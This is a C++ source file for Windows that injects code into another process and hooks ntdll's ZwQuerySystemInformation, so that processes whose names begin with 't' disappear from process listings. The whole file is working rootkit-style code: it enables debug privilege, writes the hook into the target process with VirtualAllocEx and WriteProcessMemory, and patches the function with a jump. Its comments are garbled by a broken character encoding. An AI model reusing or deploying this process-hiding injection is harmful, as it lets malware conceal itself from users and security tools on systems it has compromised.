#include "ZwQuerySystemInformation.h"
#include <stdio.h>

extern "C" LONG(__stdcall *ZwQuerySystemInformation)(
	_In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,
	_Inout_   PVOID                    SystemInformation,
	_In_      ULONG                    SystemInformationLength, _Out_opt_ PULONG                   ReturnLength
	) = NULL;

__declspec (naked) VOID FunStart() {};//���庯����ʼ��λ�� release�汾 û��
__declspec (naked) VOID ZwQuerySystemInformationProxy()
{
	//���ﱸ������ֽھͿ����˵���ΪZwxx�ĺ�����ʽԭ������̶������޸��ֽ�
	_asm {
		nop
		nop
		nop
		nop
		nop
		mov ebx, 0x88888888 //ZwQuerySystemInformation ����������λ
		jmp ebx
	}
}

NTSTATUS
NTAPI
HOOK_ZwQuerySystemInformation(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	OUT PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength OPTIONAL
)
{
	NTSTATUS ntStatus;
	PSYSTEM_PROCESSES pSystemProcesses = NULL, Prev;

	_asm {
		push ebx
		push ReturnLength
		push SystemInformationLength
		push SystemInformation
		push SystemInformationClass
		call ZwQuerySystemInformationProxy //��ԭ������ִ�����,ֻ�������������ܷ���������Ҫ������Ȼ��������������޸�
		mov ntStatus, eax
		pop ebx
	}

	if (ntStatus != STATUS_INFO_LENGTH_MISMATCH && NT_SUCCESS(ntStatus) && SystemInformationClass == 5) {

		PSYSTEM_PROCESS_INFORMATION pCurr = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
		PSYSTEM_PROCESS_INFORMATION pPrev = NULL;

		while (pCurr)
		{
			LPWSTR pszProcessName = pCurr->ImageName.Buffer;
			if (pszProcessName != NULL)
			{
				bool find = true;
				for (int i = 0; i<pCurr->ImageName.Length&&i<1; i++) {
					if (*((char*)pszProcessName + i) == 't'|| *((char*)pszProcessName + i) == 'T') {
					}
					else
					{
						find = false;
						break;
					}
				}
				//if (0 == memcmp(pszProcessName, L"notepad.exe", pCurr->ImageName.Length>22 ? 22 : pCurr->ImageName.Length) || 0 == memcmp(pszProcessName, L"chrome.exe", pCurr->ImageName.Length>20 ? 20 : pCurr->ImageName.Length))
				if (find)
				{
					if (pPrev) // Middle or Last entry
					{
						if (pCurr->NextEntryOffset)
							pPrev->NextEntryOffset += pCurr->NextEntryOffset;
						else // we are last, so make prev the end
							pPrev->NextEntryOffset = 0;
					}
					else
					{
						if (pCurr->NextEntryOffset)
						{
							// we are first in the list, so move it forward
							SystemInformation = (UCHAR*)SystemInformation + pCurr->NextEntryOffset;
						}
						else // Ψһ�Ľ���
							SystemInformation = NULL;
					}
				}
				else
				{
					pPrev = pCurr;
				}
			}
			else
			{
				pPrev = pCurr;
			}
			if (pCurr->NextEntryOffset)
			{
				pCurr = (PSYSTEM_PROCESS_INFORMATION)(((PUCHAR)pCurr) + pCurr->NextEntryOffset);
			}
			else
			{
				pCurr = NULL;
			}

		}
	}
	return ntStatus;
}
__declspec (naked) VOID FunEnd() { _asm {nop} };//���庯��������λ��

DWORD GetFunAddress(PUCHAR lpFunStart)
{
	DWORD dwFunAddress;
	if (*lpFunStart == 0xE9)
	{
		//��Debug�汾��VC����һ����ת
		dwFunAddress = (DWORD)lpFunStart + *(DWORD *)(lpFunStart + 1) + 5;
	}
	else
	{
		dwFunAddress = (DWORD)lpFunStart;
	}
	return dwFunAddress;
}

BOOLEAN _SetHook(DWORD dwProcessId)
{
	BOOLEAN bRet = FALSE;
	DWORD OldProtect;
	DWORD dwCodeStart, dwCodeEnd, dwCodeSize;
	BYTE HookCode[5] = { 0xE9,0,0,0,0 };
	HANDLE hProcess = NULL;
	PVOID RemoteAllocBase = NULL;
	DWORD dwFunAddress;
	PUCHAR pBuffer;

	dwCodeStart = GetFunAddress((PUCHAR)FunStart);
	dwCodeEnd = GetFunAddress((PUCHAR)FunEnd);
	dwCodeSize = dwCodeEnd - dwCodeStart;

	hProcess = OpenProcess(PROCESS_ALL_ACCESS | PROCESS_VM_OPERATION,
		FALSE,
		dwProcessId
	);

	if (hProcess) {
		HANDLE hToken;
		if (OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken)) {
			printf("Open Process Token Success!\n");
			TOKEN_PRIVILEGES tkp;
			LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid);
			tkp.PrivilegeCount = 1;
			tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			if (AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof tkp, NULL, NULL)) printf("ok\n");//֪ͨϵͳ�޸Ľ���Ȩ��
			//PRIVILEGE_SET RequiredPrivileges = { 0 };
			//RequiredPrivileges.Control = PRIVILEGE_SET_ALL_NECESSARY;
			//RequiredPrivileges.PrivilegeCount = 1;
			//RequiredPrivileges.Privilege[0].Luid = tkp.Privileges[0].Luid;
			//RequiredPrivileges.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;
			//BOOL bResult = 0;
			//PrivilegeCheck(hToken, &RequiredPrivileges, &bResult);
			//if (bResult) printf("\n can debug");
		}
		else {
			printf("Open Process Token Fail!\n");
		}
		RemoteAllocBase = VirtualAllocEx(hProcess,
			NULL,
			dwCodeSize,
			MEM_COMMIT,
			PAGE_EXECUTE_READWRITE
		);
		if (RemoteAllocBase) {
			//printf("\t�����ڴ��ַ��0x%x\n", RemoteAllocBase);
			//g_lpRemoteAllocBase = RemoteAllocBase;
			if (ZwQuerySystemInformation) {
				bRet = VirtualProtect((PVOID)dwCodeStart,
					dwCodeSize,
					PAGE_EXECUTE_READWRITE,
					&OldProtect
				);
				if (bRet) {
					memcpy(ZwQuerySystemInformationProxy, ZwQuerySystemInformation, 5); //��������ڱ�������ȡ���ݴ���Ҳ������Զ�̽�����ȡһ�����������һ����
																						//for (int i = 0; i < 50;i++) printf("\ndata %d is 0x%x\n",i, *(DWORD *)(dwCodeStart + i));
																						//*(DWORD *)(dwCodeStart + 22) = (DWORD)ZwQuerySystemInformation;//���ﲻ��Ҫ��������λ,��Ϊ�϶����ڵ������ֽڿ�ʼ�ĵط�
					for (int i = 0; i < 50; i++) {
						if (0x88888888 == *(DWORD *)(dwCodeStart + i)) {
							*(DWORD *)(dwCodeStart + i) = (DWORD)ZwQuerySystemInformation + 5;
						}
						//printf("\ndata %d is 0x%x\n", i, *(DWORD *)(dwCodeStart + i));
					}
					*HookCode = 0xE9;
					dwFunAddress = GetFunAddress((PUCHAR)HOOK_ZwQuerySystemInformation);
					dwFunAddress -= dwCodeStart;
					dwFunAddress += (DWORD)RemoteAllocBase; //����HOOK_ZwQuerySystemInformation��Ŀ������еĵ�ַ
					*(DWORD *)((char*)HookCode + 1) = (DWORD)dwFunAddress - 5 - (DWORD)ZwQuerySystemInformation;
					VirtualProtect((PVOID)dwCodeStart,
						dwCodeSize,
						PAGE_EXECUTE_READWRITE,
						&OldProtect
					);
				}
			}
			bRet = WriteProcessMemory(hProcess,
				RemoteAllocBase,
				(PVOID)dwCodeStart,
				dwCodeSize,
				NULL
			);
			if (bRet) {
				bRet = WriteProcessMemory(hProcess,
					ZwQuerySystemInformation,
					HookCode,
					5,
					NULL
				);
				if (!bRet) printf("fail to write ! error:%d", GetLastError());
				else
				{
					printf("Hook To PID=%d Success\n",dwProcessId);
				}
			}
		}
		else {
			printf("Cannot Alloc whith error code:%d", GetLastError());
		}
		CloseHandle(hProcess);
	}
	return bRet;
}

BOOLEAN SetHook(DWORD dwProcessId) {
	HINSTANCE   hNTDLL = ::GetModuleHandle(TEXT("ntdll"));

	(FARPROC&)ZwQuerySystemInformation =
		::GetProcAddress(hNTDLL, "ZwQuerySystemInformation");
	BOOLEAN res = _SetHook(dwProcessId);
	FreeLibrary(hNTDLL);
	return res;
}
